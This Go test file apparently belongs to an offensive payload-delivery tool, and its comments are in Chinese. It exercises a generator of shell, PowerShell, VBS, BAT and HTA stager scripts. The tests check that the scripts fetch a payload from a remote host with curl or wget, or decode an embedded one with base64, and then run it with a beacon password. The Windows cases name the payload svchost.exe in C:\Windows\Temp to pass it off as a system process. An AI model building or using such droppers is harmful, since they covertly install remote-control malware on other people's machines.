package delivery

import (
	"strings"
	"testing"
)

func TestGenerateShellScript(t *testing.T) {
	// url 模式（带口令）
	out := GenerateScript("sh", "url", "http://1.2.3.4:8089/d/abc/full/payload", "/tmp", "payload", "123456", nil)
	s := string(out)
	if !strings.Contains(s, "curl") || !strings.Contains(s, "wget") {
		t.Fatalf("url 模式应含 curl/wget: %s", s)
	}
	if !strings.Contains(s, `"/tmp/payload" 123456 &`) {
		t.Fatalf("应附带上线口令: %s", s)
	}
	if strings.Contains(s, `\`) {
		t.Fatalf("Linux 路径不应含反斜杠: %s", s)
	}

	// embed 模式
	out2 := GenerateScript("sh", "embed", "http://x/full/p", "/tmp", "payload", "", []byte("MZ-payload"))
	s2 := string(out2)
	if !strings.Contains(s2, "base64 -d") {
		t.Fatalf("embed 模式应 base64 -d: %s", s2)
	}
	if strings.Contains(s2, `\`) {
		t.Fatalf("embed Linux 路径不应含反斜杠: %s", s2)
	}
}

func TestGenerateWindowsScriptsWithPass(t *testing.T) {
	win := []string{"ps1", "vbs", "bat", "hta"}
	for _, kind := range win {
		// 带口令：应含 123456
		out := GenerateScript(kind, "url", "http://x/full/p", `C:\Windows\Temp`, "svchost.exe", "123456", nil)
		s := string(out)
		if !strings.Contains(s, "123456") {
			t.Fatalf("%s 应附带上线口令: %s", kind, s)
		}
		if !strings.Contains(s, `C:\Windows\Temp\svchost.exe`) {
			t.Fatalf("%s 路径应为反斜杠: %s", kind, s)
		}
		// 无口令：不应有尾随双空格
		out2 := GenerateScript(kind, "url", "http://x/full/p", `C:\Windows\Temp`, "svchost.exe", "", nil)
		s2 := string(out2)
		if strings.Contains(s2, `exe"  `) || strings.Contains(s2, `exe  `) {
			t.Fatalf("%s 无口令时不应有双空格: %q", kind, s2)
		}
	}
}
